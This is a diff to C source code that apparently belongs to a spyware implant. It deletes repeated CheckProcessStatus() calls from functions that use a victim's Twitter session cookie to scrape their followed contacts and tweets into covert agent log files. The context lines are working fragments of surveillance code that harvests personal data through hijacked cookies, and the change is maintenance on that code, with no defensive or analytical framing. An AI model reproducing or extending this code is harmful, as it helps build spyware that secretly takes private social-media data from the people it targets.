@@ -96,7 +96,6 @@ extern wchar_t *UTF8_2_UTF16(char *str); // in firefox.cpp
 //			return ret_val;
 //		}
 //	
-//		CheckProcessStatus();
 //
 //		// Verifica quale tag c'e' per primo
 //		parser_inner1 = strstr((char *)r_buffer_inner, TW_CONTACT_ID1);
@@ -174,7 +173,6 @@ DWORD ParseFollowing(char *user, char *cookie)
 	if (ret_val != SOCIAL_REQUEST_SUCCESS)
 		return ret_val;
 	
-	CheckProcessStatus();
 
 	parser1 = (char *)r_buffer;
 	hfile = Log_CreateFile(PM_CONTACTSAGENT, NULL, 0);
@@ -247,7 +245,6 @@ DWORD HandleTwitterContacts(char *cookie)
 	static BOOL scanned = FALSE;
 	HANDLE hfile;
 
-	CheckProcessStatus();
 
 	if (!bPM_ContactsStarted)
 		return SOCIAL_REQUEST_NETWORK_PROBLEM;
@@ -342,7 +339,6 @@ DWORD ParseTweet(char *user, char *cookie)
 		4] timestamp
 	*/
 	for (;;) {
-		CheckProcessStatus();
 		/* 2] tweet id
 			e.g. data-tweet-id="526625177615220736"
 		*/
@@ -485,7 +481,6 @@ DWORD ParseTweet(char *user, char *cookie)
 //	parser1 = (char *)r_buffer;
 //	
 //	for (;;) {
-//		CheckProcessStatus();
 //		parser1 = strstr(parser1, TW_TWEET_TS);
 //		if (!parser1)
 //			break;
@@ -566,7 +561,6 @@ DWORD HandleTwitterTweets(char *cookie)
 	char *parser1, *parser2;
 	char user[256];
 
-	CheckProcessStatus();
 
 	if (!bPM_IMStarted)
 		return SOCIAL_REQUEST_NETWORK_PROBLEM;
